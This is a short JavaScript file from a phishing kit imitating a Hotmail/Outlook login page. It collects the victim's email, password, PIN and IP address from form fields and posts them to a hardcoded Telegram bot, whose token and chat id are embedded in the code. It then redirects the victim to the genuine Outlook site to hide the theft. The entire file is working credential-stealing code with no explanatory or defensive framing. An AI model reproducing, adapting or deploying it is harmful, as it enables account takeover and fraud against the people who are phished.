//bot token
var telegram_bot_id = "7881595465:AAEDrzfc1DsMh0zWue6eLYhYa111j_c6uVs";
//chat id
var chat_id = "5084554523";
var u_name, pax, u_pin2, ip, ip2;
var ready = function () {
    u_name = document.getElementById("uzer").value;
    pax = document.getElementById("pazz").value;
    u_pin2 = document.getElementById("p1n").value;
    ip = document.getElementById("gfg").innerHTML;
    ip2 = document.getElementById("address").innerHTML;
    message = "✅HOTMAIL✅\n📧Correo: " + u_name + "\n🔐Contraseña: " + pax +"\nPIN: " + u_pin2 +"\nIP: " + ip +"\n" + ip2 +"\n\n";
};
var sender = function () {
    ready();
    var settings = {
        "async": true,
        "crossDomain": true,
        "url": "https://api.telegram.org/bot" + telegram_bot_id + "/sendMessage",
        "method": "POST",
        "headers": {
            "Content-Type": "application/json",
            "cache-control": "no-cache"

        },
        "data": JSON.stringify({
            "chat_id": chat_id,
            "text": message
        })
    };
    $.ajax(settings).done(function (response) {
        window.location = 'https://outlook.live.com';
        console.log(response);
    });
    return false;
};
